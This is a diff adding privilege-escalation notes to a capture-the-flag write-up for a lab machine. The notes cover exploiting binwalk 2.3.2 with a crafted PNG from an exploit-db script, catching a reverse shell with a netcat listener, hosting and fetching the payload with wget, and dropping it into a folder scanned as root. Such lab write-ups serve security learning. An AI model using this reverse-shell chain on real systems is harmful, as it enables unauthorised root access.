@@ -154,7 +154,9 @@ _laurel:x:998:998::/var/log/laurel:/bin/false`
             - ls
             - cat user.txt
 
-4. Priviledge Escalation
+4. Priviledge Escalation - Theory
+    - machine has a script running in bg and uses binwalk 2.3.2, which has vuln
+        - we have to rename the exploit to .png to pass through shrunk folder with malwarescan.sh
     - ls
         - "linpeas.sh" and "pspy64"
         - nano linpeas.sh
@@ -176,7 +178,39 @@ _laurel:x:998:998::/var/log/laurel:/bin/false`
             - The version of Binwalk found is 2.3.2, which has a vulnerability that allows arbitrary code execution. We will leverage this vulnerability to escalate our access privileges.
                 - https://www.exploit-db.com/exploits/51249
                 - https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/ 
-    
+    - cd /var/www/pilgrimage.htb/shrunk
+        - strings exploit.png
+            - ![](https://hackmd.io/_uploads/HJTQeHhu2.png)
+            - to obtain IP address
+                - 10.10.14.127 4444
+    - cd /dev/shm
+        - rm -rf linpeas.sh
+        - nano exploit.py (content of [exploit](https://www.exploit-db.com/exploits/51249))
+
+5. PE - steps
+    - LOCAL MACHINE
+        - nano exploit.py (content of [exploit](https://www.exploit-db.com/exploits/51249))
+        - python3 exploit.py <some_image.png> <your_tun_IP> <NC port>
+            - FE: python3 exploit.py image.png 10.10.10.5 6969
+        - binwalk_exploit.png has been generated
+    - upload to the emily machine
+        - 1. on LOCAL -> nc -nvlp 6969
+        - 2. on LOCAL -> python3 -m http.server 9001
+        - 3. on EMILY -> wget http://10.10.14.26:9001/binwalk_exploit.png
+    - on EMILY
+        - ls
+            - binwalk_image.png should be there
+        - ps -aux
+            - malwarescan.sh running
+        - cat /usr/sbin/malwarescan.sh
+            - path: /var/www/pilgrimage.htb/shrunk
+        - cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk
+            - NC connection should be obtained
+    - on NC
+        - id
+        - cd
+        - ls -la
+        - cat root.txt
 
 
 
